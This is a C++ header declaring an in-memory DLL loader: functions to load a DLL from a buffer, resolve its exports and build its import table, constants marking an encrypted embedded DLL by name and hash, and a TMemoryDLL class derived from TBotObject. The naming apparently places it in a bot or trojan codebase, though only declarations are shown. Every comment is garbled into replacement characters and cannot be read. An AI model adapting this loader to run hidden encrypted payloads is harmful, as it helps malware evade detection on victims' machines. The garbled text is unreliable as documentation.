
//****************************************************************************
//  ������ ������ � ������������ ������������ � ������
//
//  ������: 1.0.1
//  �������������: ������ 2012
//****************************************************************************


#ifndef DllLoaderH
#define DllLoaderH
//----------------------------------------------------------------------------

#include <windows.h>
#include "GetApi.h"
#include "Strings.h"

typedef void *HMEMORYMODULE;

//-------------------------------------------------------
//  MemoryLoadLibrary - ������� ��������� � ������ ��
//                      ����������� ������ ������
//-------------------------------------------------------
HMEMORYMODULE MemoryLoadLibrary(const void *);


//-------------------------------------------------------
//  MemoryGetProcAddress - ������� ���������� �����
//                     ������� ����������� � ������ DLL
//-------------------------------------------------------
FARPROC MemoryGetProcAddress(HMEMORYMODULE Dll, const char* Name);

//-------------------------------------------------------
//  MemoryFreeLibrary - ������� ����������� �������
//                      ���������� ��� DLL � ������
//-------------------------------------------------------
void MemoryFreeLibrary(HMEMORYMODULE);



//-------------------------------------------------------
//  BuildImport - ������� ������ ������� ������� dll.
//                � ������ ������� � ������ �������
//                �������� �� ���������� ������� �������.
//                ������� ���������� ��� ������� �����
//                ������� ������� ���������� � �������
//                �������.
//-------------------------------------------------------
bool BuildImport(PVOID ImageBase);





//*******************************************************
//  ������ ��� ������ � ������������ DLL
//*******************************************************

//----------------------------------
//  ������ DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER   "_DLL_DATA_"


//----------------------------------
//  ������ ������� DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER_SIZE 10

//----------------------------------
//  ��� ������� DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER_HASH 0x8CAC120C /* _DLL_DATA_ */




//*******************************************************
// TDLL - ����� �������������� ��������, ��������
//        ��������� �� ������
//        ����� ������������� �������������� �����������
//        ����������
//
//  �������� ���������� DLL:
//*******************************************************
class TMemoryDLL : public TBotObject
{
private:
	HMEMORYMODULE FHandle;
	DWORD  FSize;
	LPVOID FSourceBuffer;
public:
	// �������� DuplicateBuffer �������� ������ ��������� � �����������
	// �������. ���� ������� true �� �������������� ����� �����
	// ��������� �� ���������� ���� ����� ������
	TMemoryDLL(const void* DllBuf, bool DuplicateBuffer = false);
	~TMemoryDLL();

	DWORD         inline Size()           { return FSize; }       // ������ ����������
	LPVOID        inline SourceBuffer()   { return FSourceBuffer; } // ��������� �� �������� ����� DLL

	HMEMORYMODULE inline Handle() { return FHandle; }
	bool		  IsTrue() { return FHandle != NULL; } //true ���� dll ����������������

	LPVOID        GetProcAddress(const char*   Name);
	LPVOID inline GetProcAddress(const string& Name) { return GetProcAddress(Name.t_str()); }
	bool          GetProcAddress(const char*   Name, LPVOID &Addr);
	bool   inline GetProcAddress(const string& Name, LPVOID &Addr) { return GetProcAddress(Name.t_str(), Addr); }
};



//----------------------------------------------------------------------------
#endif